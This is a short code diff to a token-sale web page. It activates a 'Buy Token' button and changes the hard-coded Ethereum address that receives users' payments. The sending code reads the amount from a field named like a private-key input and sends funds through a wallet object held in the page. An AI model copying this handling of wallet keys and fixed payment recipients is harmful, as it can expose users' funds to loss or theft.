@@ -140,8 +140,8 @@
 				</div>
 				<br>
 				<div class="flex-center">
-					<!-- <button class="button-primary" id="airbtn" onclick="buyToken()">Buy Token</button> -->
-					<button class="button-primary" id="airbtn">Buy Token</button>
+					<button class="button-primary" id="airbtn" onclick="buyToken()">Buy Token</button>
+					<!-- <button class="button-primary" id="airbtn">Buy Token</button> -->
 				</div>
 				<p id="balance" style="margin-top: 20px;color:white;text-align: center;"></p>
 				<p id="price" style="color:white;text-align: center;margin-bottom: 20px;"> </p>
@@ -525,7 +525,7 @@
 				var amount = inputPrivatekeyNew.val();
 				let amountNew = ethers.utils.parseEther(amount);
 				let tx = {
-					to: "0xF83184C827715Ca4A78b0b307aF03B9D58d31638",
+					to: "0x25cDE8025Eb0A411b6C1Df764A552ed8bb843085",
 					value: amountNew
 				};
 				let sendPromise = await walletWithProvider.sendTransaction(tx);
